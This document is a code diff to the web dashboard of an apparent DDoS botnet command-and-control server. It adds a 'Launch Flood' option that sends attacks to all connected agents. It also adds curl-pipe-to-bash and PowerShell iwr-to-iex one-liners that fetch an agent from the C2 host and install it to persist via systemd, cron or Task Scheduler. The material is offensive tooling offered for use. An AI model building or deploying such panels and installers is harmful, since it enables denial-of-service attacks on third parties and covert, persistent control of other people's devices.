@@ -94,6 +94,20 @@
                                     <button type="button" class="preset preset-red" onclick="applyPreset(150,500,30)">Blitz</button>
                                 </div>
                             </div>
+                            <div class="field">
+                                <label>Launch Mode</label>
+                                <div class="toggle-row">
+                                    <label class="toggle-label">
+                                        <input type="checkbox" id="opt-local" checked>
+                                        <span class="toggle-text">This server (via proxy)</span>
+                                    </label>
+                                    <label class="toggle-label">
+                                        <input type="checkbox" id="opt-bots" checked>
+                                        <span class="toggle-text">All connected agents</span>
+                                        <span class="badge" id="agent-count-badge" style="margin-left:6px">0</span>
+                                    </label>
+                                </div>
+                            </div>
                             <button type="submit" class="btn btn-primary btn-full" id="start-btn">Launch Flood</button>
                         </form>
                     </section>
@@ -160,35 +174,44 @@
             <div class="content-area">
                 <div class="grid-1">
 
-                    <!-- Agent generator -->
+                    <!-- Agent installer -->
                     <section class="card">
-                        <div class="card-header">Generate Agent</div>
+                        <div class="card-header">Onboard Device</div>
                         <div class="form">
-                            <p style="font-size:.83rem;color:#64748b;margin-bottom:4px">
-                                Enter your C2 server IP (the machine running <code style="background:#f1f5f9;padding:2px 5px;border-radius:3px">server.py</code>).
-                                The downloaded <strong>agent.py</strong> will have the address baked in — copy it to any device and run
-                                <code style="background:#f1f5f9;padding:2px 5px;border-radius:3px">python3 agent.py</code>.
+                            <p style="font-size:.83rem;color:#64748b;margin-bottom:2px">
+                                Enter your C2 server IP. One-liner installer commands are generated below — paste onto any device. The installer auto-detects the OS, installs Python if missing, downloads the agent with C2 address baked in, and sets it up to run persistently in the background.
                             </p>
-                            <div class="field-row" style="align-items:flex-end">
+                            <div class="field-row" style="align-items:flex-end;grid-template-columns:1fr 130px">
                                 <div class="field">
                                     <label>C2 Server IP</label>
-                                    <input type="text" id="c2-host" placeholder="192.168.1.10" style="font-family:monospace">
+                                    <input type="text" id="c2-host" placeholder="192.168.1.10" style="font-family:monospace" oninput="updateInstallers()">
                                 </div>
-                                <div class="field" style="max-width:120px">
+                                <div class="field">
                                     <label>C2 Port</label>
-                                    <input type="number" id="c2-port" value="5000" min="1" max="65535" style="font-family:monospace">
-                                </div>
-                                <div class="field" style="justify-content:flex-end">
-                                    <button class="btn btn-primary" onclick="downloadAgent()">Download agent.py</button>
+                                    <input type="number" id="c2-port" value="5000" min="1" max="65535" style="font-family:monospace" oninput="updateInstallers()">
                                 </div>
                             </div>
-                            <div id="agent-status" class="cfg-status"></div>
 
-                            <!-- Preview of how to run it -->
-                            <div style="background:#0f172a;border-radius:8px;padding:14px 16px;margin-top:4px">
-                                <div style="font-size:.73rem;color:#64748b;margin-bottom:8px;text-transform:uppercase;letter-spacing:.05em">Deployment — run on each target device</div>
-                                <pre id="deploy-preview" class="code-block" style="margin:0;background:transparent;padding:0">python3 agent.py</pre>
-                                <div style="font-size:.73rem;color:#475569;margin-top:8px">The agent auto-registers, polls for tasks every 5s, and executes floods when dispatched.</div>
+                            <!-- Linux / macOS -->
+                            <div style="background:#0f172a;border-radius:8px;padding:14px 16px">
+                                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+                                    <span style="font-size:.73rem;color:#64748b;text-transform:uppercase;letter-spacing:.05em">Linux / macOS — paste in terminal</span>
+                                    <button class="btn-link" onclick="copyInstaller('sh')">Copy</button>
+                                </div>
+                                <pre id="install-sh" class="code-block" style="margin:0;background:transparent;padding:0;color:#4ade80">curl -s "http://YOUR_C2_IP:5000/install.sh?host=YOUR_C2_IP&amp;port=5000" | bash</pre>
+                            </div>
+
+                            <!-- Windows -->
+                            <div style="background:#0f172a;border-radius:8px;padding:14px 16px">
+                                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+                                    <span style="font-size:.73rem;color:#64748b;text-transform:uppercase;letter-spacing:.05em">Windows — paste in PowerShell</span>
+                                    <button class="btn-link" onclick="copyInstaller('ps1')">Copy</button>
+                                </div>
+                                <pre id="install-ps1" class="code-block" style="margin:0;background:transparent;padding:0;color:#60a5fa">iwr "http://YOUR_C2_IP:5000/install.ps1?host=YOUR_C2_IP&port=5000" | iex</pre>
+                            </div>
+
+                            <div style="font-size:.78rem;color:#64748b;padding:2px 0">
+                                The agent installs to <code style="background:#f1f5f9;padding:1px 5px;border-radius:3px">~/.l7agent/</code>, starts immediately, and persists across reboots via systemd / cron / Task Scheduler.
                             </div>
                         </div>
                     </section>
